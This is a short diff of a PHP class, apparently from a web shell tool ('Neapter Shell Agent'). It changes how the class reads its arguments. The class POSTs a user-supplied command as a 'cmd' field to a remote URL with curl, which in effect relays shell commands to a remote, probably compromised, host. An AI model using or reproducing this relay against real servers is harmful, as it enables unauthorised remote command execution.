@@ -75,7 +75,7 @@ DATA;
 		/**
 		 * Help
 		 */
-		if( $this -> oShell -> iArgc < 2 )
+		if( $this -> oShell -> getArgs() -> getNumberOfParams() < 2 )
 		{
 			return $this -> getHelp();
 		}
@@ -91,20 +91,15 @@ DATA;
 		$rCurl = curl_init();
 
 		/**
-		 * Zdalne polecenie
-		 */
-		preg_match( sprintf( '~%s\"?\s+(.+)~', $this -> oShell -> aArgv[0] ), $this -> oShell -> sArgv, $aCommand );
-
-		/**
 		 * Parametry
 		 */
 		curl_setopt_array( $rCurl, array
 			(
-				CURLOPT_URL            => $this -> oShell -> aArgv[0],
+				CURLOPT_URL            => $this -> oShell -> getArgs() -> getParam( 0 ),
 				CURLOPT_USERAGENT      => 'Neapter Shell Agent',
 				CURLOPT_ENCODING       => 'gzip, deflate',
 				CURLOPT_POST           => TRUE,
-				CURLOPT_POSTFIELDS     => array( 'cmd' => $aCommand[1] ),
+				CURLOPT_POSTFIELDS     => array( 'cmd' => $this -> oShell -> getArgs() -> getParam( 1 ) ),
 				CURLOPT_CONNECTTIMEOUT => 60,
 				CURLOPT_RETURNTRANSFER => TRUE,
 				CURLOPT_HTTPHEADER     => array( 'X-Requested-With: XMLHttpRequest' )
